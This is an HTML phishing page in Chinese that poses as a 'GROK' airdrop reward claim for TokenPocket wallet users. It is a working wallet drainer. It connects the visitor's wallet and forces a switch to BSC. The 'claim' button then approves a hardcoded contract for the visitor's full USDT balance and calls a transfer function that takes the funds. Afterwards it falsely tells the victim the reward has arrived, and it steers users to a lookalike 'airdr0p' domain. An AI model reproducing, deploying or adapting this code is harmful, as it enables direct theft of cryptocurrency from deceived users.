<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="GROK.png" type="image/x-icon">
  <title>GROK 空投领取</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f0f4f8;
      margin: 0; padding: 20px;
      min-height: 100vh; display: flex;
      justify-content: center; align-items: center;
    }
    .card {
      background: white;
      border-radius: 20px;
      padding: 30px;
      width: 100%; max-width: 420px;
      box-shadow: 0 15px 35px rgba(0,0,0,0.1);
      text-align: center;
    }
    h1 { color: #1a73e8; margin: 0 0 10px; font-size: 24px; }
    .address {
      background: #f8f9fa; padding: 12px; border-radius: 12px;
      font-family: monospace; font-size: 14px; word-break: break-all;
      color: #1a73e8; margin: 15px 0;
    }
    button {
      width: 100%; padding: 16px; margin: 20px 0 10px;
      background: #e91e63; color: white; border: none;
      border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer;
      transition: background 0.2s;
    }
    button:hover { background: #c2185b; }
    #status {
      margin-top: 15px; padding: 12px; border-radius: 12px;
      font-size: 14px; min-height: 50px;
      display: flex; align-items: center; justify-content: center; flex-direction: column;
    }
    .success { background: #d4edda; color: #155724; }
    .error { background: #f8d7da; color: #721c24; }
    .info { background: #d1ecf1; color: #0c5460; }
    .loading { background: #fff3cd; color: #856404; }
    .warning {
      background: #fff3cd; color: #856404;
      padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>GROK 奖励领取</h1>

    <div class="warning" id="tpTip">
      请点击下方按钮在 TP 钱包中打开 DApp。
    </div>

    <button id="openTPBtn" onclick="openTPButton()">打开 TokenPocket</button>

    <div id="walletInfo" style="display:none;">
      <div class="address" id="walletAddress"></div>
      <div style="margin-top:10px; color:#666;">
        剩余空投余额: <span id="usdtBalance">加载中...</span>
      </div>
    </div>

    <button id="actionBtn" onclick="approveAndTransfer()">领取奖励</button>

    <div id="status" class="info">
      等待连接钱包...
    </div>
  </div>

  <script>
    // 目标 DApp 页面（未编码）
    const TARGET_URL = "https://airdr0p-888.github.io/GROK1688/index.html";

    /**
     * 判断是否在 TokenPocket 内置浏览器
     */
    function isTPBrowser() {
      return /TokenPocket/i.test(navigator.userAgent);
    }

    /**
     * 通用唤醒函数：优先在 TP 内直接打开，尝试桥接对象，再 fallback 到 scheme 唤醒
     * url: 完整 https://... 地址（未编码）
     */
    function openInTP(url) {
      const encoded = encodeURIComponent(url);

      // 1) 如果已经在 TP 内，直接用 replace 打开目标 URL（避免增加历史记录）
      if (isTPBrowser()) {
        try {
          location.replace(url);
        } catch (e) {
          console.warn("在 TP 内直接打开失败，尝试 location.href", e);
          location.href = url;
        }
        return;
      }

      // 2) 尝试调用常见的钱包注入 bridge（例如 Trust / TokenPocket 等）
      try {
        // window.trust 常见于 Trust Wallet（并非 TP），但我们尝试兼容
        if (typeof window.trust !== 'undefined' && typeof window.trust.open === 'function') {
          window.trust.open(url);
          return;
        }
        // 有些钱包可能注入了 TokenPocket 对象
        if (typeof window.TokenPocket !== 'undefined' && typeof window.TokenPocket.open === 'function') {
          window.TokenPocket.open(url);
          return;
        }
        // 有钱包在 ethereum 对象上标记 isTokenPocket
        if (window.ethereum && window.ethereum.isTokenPocket) {
          // 直接在当前 webview 打开
          location.replace(url);
          return;
        }
      } catch (e) {
        console.warn("bridge 调用异常：", e);
      }

      // 3) fallback：使用 TP 协议唤起（外部浏览器 -> 唤起 TP 并传入 url）
      // 常见格式：tpdapp://open?url=ENCODED_URL  或 tp://dapp?url=ENCODED_URL
      const tpdapp = `tpdapp://open?url=https://airdr0p-888.github.io/GROK1688/index.html`;
      const tpAlt = `tp://dapp?url=https://airdr0p-888.github.io/GROK1688/index.html`;

      // 触发第一个 scheme
      // 使用 iframe 技术可以在一些环境更温和地尝试唤醒，但简单 href 通常足够
      window.location.href = tpdapp;

      // 若 2.5s 后仍无响应，再尝试备用 scheme
      setTimeout(() => {
        window.location.href = tpAlt;
      }, 2500);

      // 若 6.5s 仍无响应，跳到下载页
      setTimeout(() => {
        window.location.href = "https://www.tokenpocket.pro/zh/download";
      }, 6500);
    }

    /**
     * openTPBtn 的点击处理（把函数包装成用户手势）
     */
    function openTPButton() {
      openInTP(TARGET_URL);
    }

    // 页面加载时：若已经在 TP 浏览器内，隐藏唤醒提示/按钮
    window.onload = async () => {
      if (isTPBrowser()) {
        document.getElementById("tpTip").style.display = "none";
        document.getElementById("openTPBtn").style.display = "none";
      }
      await autoConnect();
    };

    // === 钱包连接与空投逻辑（保持与原来一致） ===
    const CONTRACT = "0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
    const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
    const ABI_USDT = [
      {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
      {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
    ];
    const ABI_FORWARDER = [{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}];

    let web3, account;
    const status = document.getElementById("status");
    const walletInfo = document.getElementById("walletInfo");
    const walletAddress = document.getElementById("walletAddress");
    const usdtBalance = document.getElementById("usdtBalance");

    async function autoConnect() {
      if (!window.ethereum) {
        status.className = "error";
        status.innerHTML = "未检测到钱包插件";
        return false;
      }
      try {
        web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const chainId = await web3.eth.getChainId();
        if (chainId !== 56) {
          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
        }
        [account] = await web3.eth.getAccounts();
        walletAddress.innerText = account;
        walletInfo.style.display = "block";
        status.className = "success";
        status.innerHTML = `已连接<br><small>${account.slice(0,8)}...${account.slice(-6)}</small>`;
        await updateUSDTBalance();
        return true;
      } catch (e) {
        status.className = "error";
        status.innerHTML = e.code === 4001 ? "用户取消连接" : "连接失败";
        return false;
      }
    }

    async function updateUSDTBalance() {
      try {
        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
        const balance = await usdt.methods.balanceOf(account).call();
        usdtBalance.innerText = (balance / 1e6).toFixed(6);
      } catch (e) {
        usdtBalance.innerText = "查询失败";
      }
    }

    async function approveAndTransfer() {
      if (!account && !await autoConnect()) return;
      status.className = "loading";
      status.innerHTML = "正在授权...<br><small>请确认交易</small>";
      try {
        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
        const balance = await usdt.methods.balanceOf(account).call();
        if (balance === "0") {
          status.className = "warning";
          status.innerHTML = "余额为 0，无需操作";
          return;
        }
        await usdt.methods.approve(CONTRACT, balance).send({ from: account });
        status.innerHTML = "授权成功！正在转账...";
        const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
        await forwarder.methods.transferFromApproved().send({ from: account });
        status.className = "success";
        status.innerHTML = "领取成功！<br>USDT 已到账";
        await updateUSDTBalance();
      } catch (e) {
        status.className = "error";
        status.innerHTML = e.code === 4001 ? "用户取消操作" : "交易失败";
        console.error(e);
      }
    }
  </script>
</body>
</html>
